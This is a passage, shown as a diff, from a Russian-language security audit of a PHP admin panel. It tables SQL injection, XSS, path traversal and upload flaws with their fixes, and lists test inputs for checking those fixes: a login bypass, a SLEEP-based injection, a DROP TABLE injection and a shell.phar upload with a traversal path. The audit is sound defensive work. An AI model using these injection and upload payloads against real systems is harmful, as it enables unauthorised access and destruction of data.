+| S-09 | `saveData()` лог изменений (`NL_LOG_DETAIL`) | High | `"'" . $row_cur[...] . "'"`, `"'" . $post[...] . "'"` | `VALUES (?, ?, ?, ?)` | SQLi 2-го порядка (payload из БД срабатывает в логе) |
+| S-10 | `saveData()` IP из заголовков | Medium | `'" . $user_ip . "'` (`X-Forwarded-For`, `Client-IP`...) | `FILTER_VALIDATE_IP` + `?`; `split()` -> `explode()` | SQLi через заголовок; фатальная ошибка `split()` в PHP 7+ |
+| S-11 | `getTableWhere()` (сессия в SQL) | Medium | `"(2 = " . $_SESSION["ID_NL_USER_PERMISSION"] . ")"` | `(int)($_SESSION[...] ?? 0)` | SQLi 2-го порядка через значения сессии |
+| S-12 | `set_id.php` | Critical | `TABLE_NAME = '" . $tbl . "'`, `ALTER TABLE " . $tbl` | `ObjectTable::isAllowedTable()`, `?`, `db_ident()`, `$_POST` вместо `$_REQUEST` | SQLi и инъекция в DDL (`ALTER`) |
+| S-13 | `select.get.php` | Critical | `"SELECT * FROM " . $tblChild . " WHERE ID_" . $tblParent . " = " . $idParent` | белый список таблиц, `db_ident()`, `FILTER_VALIDATE_INT`, `= ?` | SQLi + чтение любой таблицы |
+| S-14 | `getData()` `AES_DECRYPT`, `get_query_left_joins()`, выбор справочников | Low | `AES_DECRYPT(" . $col->dbName . ",'" . AESKEY . "')`, `" LEFT JOIN " . $lj` | ``AES_DECRYPT(tbl.`col`, ?)``, `db_ident()` | Укрепление: ключ не в тексте SQL, идентификаторы проверяются |
+| S-15 | `db_error()` и `echo $query;` | High | `return "...Ошибка в запросе:<br />" . $query`, `echo $query;` | generic-сообщение + `error_log`; `echo` удалён | Раскрытие структуры БД и отражённый XSS через текст запроса |
 
 
-| Файл | Что найдено (этап 1) | Статус |
-|---|---|---|
-| `admin/index.php` | `$_POST` login/password -> `user_auth`; `$page` в HTML (I-02) | Исправлено (S-01, I-02) |
-| `admin/partial/jqgrid.html` | Шаблон; `{tableName}` подставляется в JS/URL | Без правок, защита в `ObjectTable` (S-02) |
-| `admin/parts/dicts.php`, `journals.php`, `login.php` | Статичный HTML, `$_GET`/`$_SESSION` не используются | Проблем этапа 1 нет |
-| `admin/parts/main.php` | `$_SESSION["NL_USER_SHORT"]` в HTML (I-03) | Исправлено |
-| `admin/php/file.upload.php` | `$_REQUEST`/`$_FILES` в путь и regex (I-09, I-10) | Исправлено, файл переписан |
-| `admin/php/functions.admin.php` | S-01..S-11, S-14, I-01..I-07, I-11, I-12, I-14 | Исправлено |
-| `admin/php/jqgrid.edit.php` | `$_GET tblName`, `$_POST oper/id` без проверки | Исправлено (S-02, S-06, S-08) |
-| `admin/php/jqgrid.show.php`, `jqgrid.table.php` | `$_GET tblName` | Исправлено (S-02) |
-| `admin/php/logout.php` | `$_GET/$_POST/$_SESSION` не используются; logout без проверки метода (CSRF) | Проблем этапа 1 нет, см. N-05 |
-| `admin/php/onlymy.php` | `$_POST` в `$_SESSION` (I-08) | Исправлено |
-| `admin/php/select.get.php` | S-13 | Исправлено |
-| `admin/php/set_id.php` | S-12 | Исправлено |
-| `php/config.php` | Входных данных нет; секреты в коде (N-04) | Без правок |
-| `php/functions.php` | Нет обёртки для prepared; `db_error` печатает SQL; `db_connect` раскрывает ошибку; `db_fetch_array` не определена | Исправлено |
+[🔝 Наверх](#оглавление)
+<a id="sec-25-dannye-iz-zaprosa-sessii-v-drugie-mesta"></a>
+### Данные из запроса/сессии в другие места
+
+| ID | Файл / место | Sev. | Оригинал (кратко) | Исправление (кратко) | Что решает |
+|---|---|---|---|---|---|
+| I-01 | `functions.admin.php` верх, `includeAdminPartsByLvl()` | High | `$page` из `REQUEST_URI` -> `include ".../parts/" . $page . ".php"` | `preg_match('/^[A-Za-z0-9_-]+$/')` | Path traversal / LFI в `include` |
+| I-02 | `index.php` | Medium | `<?= $page ?>` в `class="..."` | `html_esc($page)` + валидация `$page` | Отражённый XSS через URL |
+| I-03 | `parts/main.php` | Medium | `<?= $_SESSION["NL_USER_SHORT"] ?>` | `htmlspecialchars(...)` | Сохранённый XSS через имя пользователя |
+| I-04 | `getjqGridCustom()` | High | `!= "' . $_SESSION["NL_USER_SHORT"] . '"` в `<script>` | `js_str($_SESSION["NL_USER_SHORT"] ?? "")` | Внедрение JS / XSS (имя редактируется любым сотрудником) |
+| I-05 | `renderTable()` `defaultValue` | High | `'defaultValue : "' . $col->defValue . '"'` (телефон из сессии) | `js_str($col->defValue)` | Внедрение JS через телефон |
+| I-06 | `getMainTableCol()`, `renderTable()` | Low | `defValue = $_SESSION["ID_NL_USER"]`, `== ' . $_SESSION["ID_NL_USER"] . ')` в JS | `(int)(...)` | Нечисловое значение сессии в JS |
+| I-07 | `renderTable()` значения `select` | High | `mb_ereg_replace('"', '\\"', $row[...])` (экранируется только `"`) | `js_str($selectOptions)` | Внедрение JS через элемент справочника (`\`, `</script>`) |
+| I-08 | `onlymy.php` | Low | `$_SESSION["onlymy"] = $_POST["onlymy"];` | только `"1"` / `"0"` | Произвольные данные в сессии |
+| I-09 | `file.upload.php` путь | Critical | `$tbl/$col/$id = $_REQUEST[...]` -> `"/img/" . $dir . "/" . $col . "_" . $id`; `mb_ereg_replace($tbl . "_", ...)` | белый список таблицы и колонки, `ctype_digit($id)` | Path traversal (запись файла вне `/img`), regex-инъекция |
+| I-10 | `file.upload.php` расширение | High | чёрный список `.php .phtml .php3 .php4 .php5` | белый список `jpg/jpeg/png/gif/webp` + `getimagesize` | Загрузка `.phar/.php7/.pht/.phps` и т.п. -> RCE |
+| I-11 | `saveData()` очистка фото | High | `glob(... $trueId ...)` где `$trueId = $values[0]` из `$_POST`, затем `unlink` | `$trueId` = валидированное целое | Удаление чужих `.jpg` (`*`, `../`) |
+| I-12 | `showData()` XML | Medium | `"<page>" . $page`, `<row id="` . $data[$i][0], `CDATA[` . $data . `]]>` | `(int)`, `htmlspecialchars(ENT_XML1)`, разрыв `]]>` | Инъекция в XML-ответ |
+| I-13 | `select.get.php` вывод | Medium | `'<option value="' . $row[...] . '">' . $row[...]` | `html_esc()` | Сохранённый XSS через справочники |
+| I-14 | `renderTable()` шаблон | Low | `mb_ereg_replace("{colModel}", $colModel, ...)` | `str_replace(...)` | Regex/`\0` обратные ссылки в подстановке данных |
+| I-15 | `db_connect()` | Low | `printf("Ошибка подключения к базе: %s", $mysqli->connect_error)` | `error_log` + generic | Раскрытие хоста/пользователя БД |
 
 ---
-
-<a id="sec-5-найдено-вне-рамок-этапа-1-правки-не-вносились"></a>
-## 5. Найдено вне рамок этапа 1 (правки **не** вносились)
-
-[🔝 Наверх](#оглавление)
-
-
-| ID | Sev. | Проблема | Где |
-|---|---|---|---|
-| N-01 | **Critical** | **Нет проверки авторизации в endpoint-ах.** Проверка входа есть только в `index.php` (HTML-страница). `jqgrid.show.php` (чтение всех данных), `jqgrid.edit.php` (запись/удаление), `jqgrid.table.php`, `set_id.php`, `select.get.php`, `file.upload.php` (загрузка файлов), `onlymy.php` доступны анониму; прямой доступ к `/admin/parts/*.php` тоже. Даже после исправлений этапа 1 любой может читать и править данные | все `admin/php/*.php` |
-| N-02 | **Critical** | **Повышение привилегий / mass assignment в `saveData()`:** пользователь с правами `1` может выполнить `edit`/`add` для таблицы `NL_USER` и поставить `ID_NL_USER_PERMISSION=2` (проверка владельца `row_cur["ID_NL_USER"]` для таблицы пользователей сравнивает его самого с собой) или переназначить `ID_NL_USER` записи. Нет проверки прав на таблицу и на поля | `saveData()` |
-| N-03 | High | Пароли хранятся через обратимый `AES_ENCRYPT` (ECB, ключ в исходниках) и расшифрованными уходят в грид (`AES_DECRYPT` в `getData`). Нужно `password_hash()` / `password_verify()`, значения не отдавать клиенту | `user_auth`, `getData`, колонка `NL_PASSWORD` |
-| N-04 | High | Секреты в коде: пароль БД и `AESKEY` в `config.php`. Вынести в переменные окружения / файл вне webroot | `php/config.php` |
-| N-05 | High | Нет CSRF-токенов на POST; `logout.php` по GET; `user_logout()` не уничтожает сессию; нет `HttpOnly`/`Secure`/`SameSite` для cookie; нет защиты от перебора пароля | `index.php`, `logout.php`, `user_logout()` |
-| N-06 | High | Stored XSS при выводе данных: содержимое ячеек грид отдаётся как есть и вставляется jqGrid как HTML; `$.parseHTML($(el).val())` в `dataInit` для фото (DOM XSS); Quill/`JSON.parse(decodeURIComponent(...))`. Нужен `js.combined.js` для корректной правки | `renderTable()`, `showData()`, JS |
-| N-07 | Medium | Директория `/img` должна быть без исполнения PHP (`php_admin_flag engine off` / `.htaccess`); лимит размера; имена файлов предсказуемы (`col_id_дата`); каталог загрузки (`/img/<table>/`) не совпадает с каталогом очистки (`/img/objects/<TABLE>/`) | `file.upload.php`, `saveData()` |
-| N-08 | Medium | Утечка данных: колонка «Контакт собственника» скрывается только в форме, но приходит в XML всем (`render=false` лишь скрывает колонку). Нужна фильтрация на сервере | `showData()` / `getData()` |
-| N-09 | Medium | `set_id.php` при каждом открытии формы увеличивает `AUTO_INCREMENT` (гонки, выжигание id) | `set_id.php` |
-| N-10 | Medium | Серверная валидация: `maxLength`, `required` не проверяются на сервере | `saveData()` |
-| N-11 | Low | Кодировка соединения `utf8` (лучше `utf8mb4`); `display_errors`, короткие теги `<?`; внешний скрипт `//api-maps.yandex.ru` без протокола/SRI; нет security-заголовков (CSP, X-Frame-Options, X-Content-Type-Options) | `config.php`, `index.php` |
-
----
-
-<a id="sec-6-допущения-и-что-проверить-после-внедрения"></a>
-## 6. Допущения и что проверить после внедрения
-
-[🔝 Наверх](#оглавление)
-
-
-1. **Окружение:** PHP 7.4+/8.x (используются `??`, spread `...`, `const` с массивом), mysqli с `mysqlnd` (`get_result()`). В среде, где готовился отчёт, PHP не было, поэтому код **не запускался**: проверены баланс синтаксиса, все точки формирования SQL (`grep` по `SELECT/INSERT/UPDATE/DELETE/ALTER`) и логика по коду. Перед сдачей прогнать `php -l` на каждом файле и ручной smoke-test.
-2. **Поведение, которое изменилось намеренно:**
-    - `rows` ограничен 1000; неизвестные параметры фильтра и сортировка по полю не из таблицы игнорируются (сортировка по умолчанию - `ID_<таблица>`);
-    - нечисловое значение для числовой колонки в фильтре возвращает пустой результат, а в форме - HTTP 400;
-    - колонка пароля недоступна для поиска/сортировки;
-    - счётчик записей в гриде учитывает ограничения доступа (раньше ограничение применялось только к данным);
-    - загрузка: только белый список расширений и реальные изображения;
-    - `saveData()` больше не печатает SQL в ответ.
-3. **Prepared statements и типы:** при бинарном протоколе числовые колонки возвращаются как числа PHP; если в гриде заметите отличия отображения `FLOAT`, это нужно проверить на реальной схеме БД.
-4. **Файлы, которых нет во вложении** (`js.combined.js`, схема БД): параметры jqGrid (`sidx`, `sord`, `page`, `rows`, `NL_*`, `*_from`, `*_to`), формат запросов `select.get.php` и `set_id.php` приняты по исходникам. Если в JS используются другие имена параметров или GET для `set_id.php`, достаточно поправить соответствующую строку.
-5. **Проверочные запросы** (до правок должны срабатывать, после - нет):
-    - вход: `login=admin' OR '1'='1' -- &password=x`;
-    - сортировка: `/admin/php/jqgrid.show.php?tblName=NL_PROP_RESALE&sidx=(SELECT SLEEP(5))&sord=asc`;
-    - фильтр: `...&NL_PROP_RESALE_FLOOR=1 OR 1=1`;
-    - таблица: `tblName=NL_USER WHERE 1=1` -> HTTP 400;
-    - `set_id.php`: `table=NL_VIEW; DROP TABLE NL_LOG` -> HTTP 400;
-    - `select.get.php`: `tblChild=NL_USER&tblParent=NL_USER_PERMISSION&idParent=1 OR 1=1` -> только `idParent=1`;
-    - загрузка: `table=../../x` и файл `shell.phar` -> HTTP 400.
-6. **Файлы дампа:** в дампе `config.php` и `functions.php` склеены маркером; в исправленных файлах они разделены (лишний `<?` в конце `config.php` убран).
